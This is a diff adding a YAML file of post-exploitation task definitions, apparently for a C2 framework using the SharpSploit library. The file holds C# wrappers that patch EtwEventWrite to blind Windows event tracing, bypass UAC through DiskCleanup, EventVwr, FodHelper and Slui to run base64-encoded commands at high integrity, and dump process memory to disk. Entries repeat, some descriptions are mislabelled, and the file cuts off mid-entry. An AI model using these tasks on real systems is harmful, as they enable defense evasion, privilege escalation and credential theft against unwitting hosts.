@@ -1,0 +1,2860 @@
+- Name: BypassETW
+  Aliases: []
+  Description: Bypass ETW by patching the EtwEventWrite function.
+  Author:
+    Name: 'Simone Salucci & Daniel López'
+    Handle: 'saim1z, attl4s'
+    Link: ''
+  Help:
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using SharpSploit.Evasion;
+
+    public static class Task
+    {
+        public static string Execute()
+        {
+            try
+            {
+                if (ETW.PatchETWEventWrite())
+                {
+                	return "ETW Patch Succeeded.";
+                }
+                else
+                {
+                	return "ETW Patch Failed.";
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: BypassUAC-DiskCleanUp
+  Aliases: []
+  Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Description: Bypasses UAC Disk Cleanup process. Parameter Command needs to end in REM.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Text;
+
+    using SharpSploit.Credentials;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string encodedCommand)
+        {
+            try
+            {
+                using (Tokens t = new Tokens())
+                {
+                    if (t.BypassUACDiskCleanup(encodedCommand))
+                    {
+                        return "Successfully executed command with high integrity.";
+                    }
+                    else
+                    {
+                        return "Failed to execute with high integrity.";
+                    }
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Bypasses UAC through FodHelper and executes a command with high integrity. (command needs to be base64 encoded
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: BypassUAC-EventVwr
+  Aliases: []
+  Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Description: Bypasses UAC through token duplication and executes a command with high integrity.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Text;
+
+    using SharpSploit.Credentials;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string encodedCommand)
+        {
+            try
+            {
+                using (Tokens t = new Tokens())
+                {
+                    if (t.BypassUACEventVwr(encodedCommand))
+                    {
+                        return "Successfully executed command with high integrity.";
+                    }
+                    else
+                    {
+                        return "Failed to execute with high integrity.";
+                    }
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Bypasses UAC through FodHelper and executes a command with high integrity. (command needs to be base64 encoded
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: BypassUAC-FodHelper
+  Aliases: []
+  Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Description: Bypasses UAC through token duplication and executes a command with high integrity.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Text;
+
+    using SharpSploit.Credentials;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string encodedCommand)
+        {
+            try
+            {
+                using (Tokens t = new Tokens())
+                {
+                    if (t.BypassUACFodHelper(encodedCommand))
+                    {
+                        return "Successfully executed command with high integrity.";
+                    }
+                    else
+                    {
+                        return "Failed to execute with high integrity.";
+                    }
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Bypasses UAC through FodHelper and executes a command with high integrity. (command needs to be base64 encoded
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: BypassUAC-Slui
+  Aliases: []
+  Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Description: Bypasses UAC through SLUI.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Text;
+
+    using SharpSploit.Credentials;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string encodedCommand)
+        {
+            try
+            {
+                using (Tokens t = new Tokens())
+                {
+                    if (t.BypassUACSlui(encodedCommand))
+                    {
+                        return "Successfully executed command with high integrity.";
+                    }
+                    else
+                    {
+                        return "Failed to execute with high integrity.";
+                    }
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Bypasses UAC through FodHelper and executes a command with high integrity. (command needs to be base64 encoded
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Author:
+    Name: Simone Salucci & Daniel López @ NCC Group
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Name: CreateProcessMinidump
+  Aliases:
+  - minidump
+  Description: Generates a minidump that represents the memory of a running process. Uses the MiniDumpWriteDump Win32 API call through PInvoke
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >
+    using System;
+
+    using System.IO;
+
+    using System.Linq;
+
+
+    using SharpSploit.Enumeration;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string Process, string OutputPath, string OutputFileName)
+        {
+            try
+            {
+                if (!Directory.Exists(OutputPath))
+                {
+                    return $"Directory: {OutputPath} does not exist.";
+                }
+                if (int.TryParse(Process, out int ProcID))
+                {
+                    if (Host.CreateProcessDump(ProcID, OutputPath, OutputFileName))
+                    {
+                        return $"Created minidump of process with PID: {ProcID} located at: {Path.Combine(OutputPath, OutputFileName)}";
+                    }
+                    return $"Failed to create minidump of process with PID: {ProcID}. {Path.Combine(OutputPath, OutputFileName)} has been deleted.";
+                }
+                if (Host.CreateProcessDump(Process, OutputPath, OutputFileName))
+                {
+                    return $"Created minidump of process: {Process} located at: {Path.Combine(OutputPath, OutputFileName)}";
+                }
+                return $"Failed to create minidump of process: {Process}. {Path.Combine(OutputPath, OutputFileName)} has been deleted.";
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  Compiled: false
+  TaskingType: Assembly
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Process
+    Value: ''
+    DefaultValue: ''
+    Description: Process name or PID
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+    GruntTaskId: 63
+  - Name: OutputPath
+    Value: ''
+    DefaultValue: C:\windows\temp\
+    Description: Path where the dump will be stored (e.g. C:\windows\temp\)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+    GruntTaskId: 63
+  - Name: OutputFileName
+    Value: ''
+    DefaultValue: dump.bin
+    Description: Name used for the dump (e.g. dump.bin)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+    GruntTaskId: 63
+- Name: BypassETW
+  Aliases: []
+  Description: Bypass ETW by patching the EtwEventWrite function.
+  Author:
+    Name: 'Simone Salucci & Daniel López'
+    Handle: 'saim1z, attl4s'
+    Link: ''
+  Help:
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using SharpSploit.Evasion;
+
+    public static class Task
+    {
+        public static string Execute()
+        {
+            try
+            {
+                if (ETW.PatchETWEventWrite())
+                {
+                	return "ETW Patch Succeeded.";
+                }
+                else
+                {
+                	return "ETW Patch Failed.";
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: BypassUAC-DiskCleanUp
+  Aliases: []
+  Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Description: Bypasses UAC Disk Cleanup process. Parameter Command needs to end in REM.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Text;
+
+    using SharpSploit.Credentials;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string encodedCommand)
+        {
+            try
+            {
+                using (Tokens t = new Tokens())
+                {
+                    if (t.BypassUACDiskCleanup(encodedCommand))
+                    {
+                        return "Successfully executed command with high integrity.";
+                    }
+                    else
+                    {
+                        return "Failed to execute with high integrity.";
+                    }
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Bypasses UAC through FodHelper and executes a command with high integrity. (command needs to be base64 encoded
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: BypassUAC-EventVwr
+  Aliases: []
+  Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Description: Bypasses UAC through token duplication and executes a command with high integrity.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Text;
+
+    using SharpSploit.Credentials;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string encodedCommand)
+        {
+            try
+            {
+                using (Tokens t = new Tokens())
+                {
+                    if (t.BypassUACEventVwr(encodedCommand))
+                    {
+                        return "Successfully executed command with high integrity.";
+                    }
+                    else
+                    {
+                        return "Failed to execute with high integrity.";
+                    }
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Bypasses UAC through FodHelper and executes a command with high integrity. (command needs to be base64 encoded
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
